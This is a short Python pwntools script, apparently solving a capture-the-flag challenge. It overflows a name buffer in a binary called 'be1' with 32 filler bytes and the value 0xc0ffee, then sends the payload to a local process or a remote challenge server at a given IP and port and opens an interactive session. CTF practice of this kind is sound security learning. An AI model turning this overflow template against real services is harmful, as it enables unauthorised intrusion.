#!/usr/bin/env python3

from pwn import *

exe = ELF("./be1", checksec=False)

# context.terminal = ['kitty', '@', 'launch', '--type=window', '--location=hsplit']
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("51.79.201.156", 7013)

    return r


def main():
    r = conn()

    offset = 32
    payload = b'A' * offset + p64(0xc0ffee)
    # good luck pwning :)
    r.sendlineafter(b'Enter your name:', payload)

    r.interactive()


if __name__ == "__main__":
    main()
